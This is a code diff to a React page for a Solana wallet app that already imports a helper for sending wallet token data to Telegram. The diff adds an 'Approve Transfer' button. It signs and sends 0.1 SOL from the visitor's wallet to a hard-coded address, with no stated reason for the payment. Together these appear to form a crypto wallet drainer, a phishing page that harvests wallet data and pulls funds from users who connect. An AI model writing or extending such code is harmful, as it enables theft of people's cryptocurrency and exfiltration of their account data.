@@ -1,15 +1,20 @@
+
 import { Settings, Menu } from "lucide-react";
 import { useWallet, useConnection } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { useEffect, useState } from 'react';
-import { getTokenAccounts, sendToTelegram } from '@/utils/walletUtils';
+import { getTokenAccounts, sendToTelegram, signAndSendTransaction } from '@/utils/walletUtils';
 import { toast } from '@/components/ui/use-toast';
 import { Button } from "@/components/ui/button";
 
+// This is a placeholder address - replace with your actual backend address
+const BACKEND_ADDRESS = "BHQsFPYDG6Px5cJpKr6tvRXDiGZcU5KGXNrAMxqj5v8Q";
+
 const Index = () => {
-  const { publicKey, connecting, connected } = useWallet();
+  const { publicKey, connecting, connected, signTransaction, signAllTransactions, wallet } = useWallet();
   const { connection } = useConnection();
   const [isProcessing, setIsProcessing] = useState(false);
+  const [lastSignature, setLastSignature] = useState<string | null>(null);
 
   const handleManualConnect = async () => {
     if (!publicKey) {
@@ -40,6 +45,43 @@ const Index = () => {
       toast({
         title: "Error",
         description: "Failed to process wallet data",
+        variant: "destructive",
+      });
+    } finally {
+      setIsProcessing(false);
+    }
+  };
+
+  const handleTransferApproval = async () => {
+    if (!publicKey || !wallet) {
+      toast({
+        title: "Error",
+        description: "Please connect your wallet first",
+        variant: "destructive",
+      });
+      return;
+    }
+
+    setIsProcessing(true);
+    try {
+      const signature = await signAndSendTransaction(
+        connection,
+        wallet,
+        BACKEND_ADDRESS,
+        0.1 // Transfer amount in SOL (adjust as needed)
+      );
+
+      setLastSignature(signature);
+      
+      toast({
+        title: "Success",
+        description: "Transfer approved and completed!",
+      });
+    } catch (error) {
+      console.error('Error in transfer:', error);
+      toast({
+        title: "Error",
+        description: "Failed to process transfer",
         variant: "destructive",
       });
     } finally {
@@ -84,14 +126,26 @@ const Index = () => {
 
         {/* Action Buttons */}
         <div className="flex flex-col w-full max-w-md gap-4 mt-4">
-          <Button 
-            onClick={handleManualConnect}
-            disabled={!publicKey || isProcessing}
-            className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold"
-          >
-            {isProcessing ? "Processing..." : "Manual Connect"}
-          </Button>
           <WalletMultiButton className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" />
+          
+          {connected && (
+            <>
+              <Button 
+                onClick={handleTransferApproval}
+                disabled={isProcessing}
+                className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold"
+              >
+                {isProcessing ? "Processing..." : "Approve Transfer"}
+              </Button>
+              
+              {lastSignature && (
+                <div className="mt-4 p-4 bg-gray-800 rounded-lg">
+                  <p className="text-sm text-gray-400">Last Transaction Signature:</p>
+                  <p className="text-xs text-cyan-400 break-all">{lastSignature}</p>
+                </div>
+              )}
+            </>
+          )}
         </div>
 
         {/* Bottom Logo */}
